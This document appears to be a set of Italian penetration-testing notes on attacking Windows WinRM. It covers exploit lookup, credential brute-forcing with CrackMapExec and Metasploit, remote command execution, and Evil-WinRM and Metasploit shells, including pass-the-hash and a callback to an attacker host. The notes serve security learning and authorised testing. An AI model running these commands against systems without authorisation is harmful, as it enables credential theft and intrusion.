<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
## Ricerca Exploit noti
Dopo aver effettuata la scansione del servizio e la sua versione nella fase di Scansione ed Enumerazione, possiamo procedere con la ricerca di exploit noti usando <a href="https://www.exploit-db.com/">Ecploit Database</a> oppure: 
```bash
searchsploit <winrm-versione> 
```
> Se restituise un exploit utilizzabile, copia il path e usa `searchsploit -m <path>`

---

## Bruteforce
Proviamo ora a cercare di ottenere le credenziali manualmente
### CrackMapExec
CrackMapExec è uno strumento multiuso per testare l’autenticazione nei servizi Windows. 
```bash
crackmapexec winrm <IP> -u <userList> -p <passwordList>
```
> la stessa sintassi vale per l'autenticazione a singolo utente

### Metasploit
```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <IP>
set USER_FILE <lista_utenti>
set PASS_FILE <lista_password>
set PASSWORD anything
run
```
> Il campo `PASSWORD` deve sempre essere valorizzato anche se stai usando un dizionario, altrimenti il modulo non eseguirà il test.

---

## Esecuzione Remota di Comandi
Dopo aver ottenuto delle credenziali per qualche account, possiamo accedere al servizio per eseguire dei comandi remoti.
### CrackMapExec
```bash
crackmapexec winrm <IP> -u <username> -p <password> -x "whoami"
```
Permette di eseguire comandi (`-x`) come `whoami`, `hostname`, `systeminfo`, ecc.

### Metasploit
```bash
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS <IP>
set USERNAME <utente>
set PASSWORD <password>
set CMD whoami
run
```
Questo modulo è utile per:
- Verificare se le credenziali funzionano
- Eseguire comandi diagnostici
- Operare in ambienti con logging avanzato
- Testare permessi utente

---

## Accesso
Dopo aver ottenuto delle credenziali e confermato che l'esecuzione dei comandi remoti funziona, possiamo accedere direttamente al servizio per averne il controllo. 
### Evil-WinRM
tool in Ruby pensato per fornire una shell interattiva remota su Windows sfruttando il servizio WinRM, autenticandosi con credenziali valide.
```bash
evil-winrm -u <username> -p '<password>' -i <IP>
```
> Per accedere con NTLM Hash cambiare `-p` con `-H`

Funzionalità disponibili:
- Shell PowerShell interattiva
- Upload e download file
- Esecuzione script PowerShell
- Post-exploitation tools

### Metasploit
```bash
use exploit/windows/winrm/winrm_script_exec
set RHOSTS <IP>
set LHOST <tuo_IP>
set LPORT <Port>
set USERNAME <utente>
set PASSWORD <password>
set FORCE_VBS true
run
```
> L’opzione `FORCE_VBS` forza l’esecuzione tramite VBScript e aumenta la compatibilità su sistemi con policy restrittive.

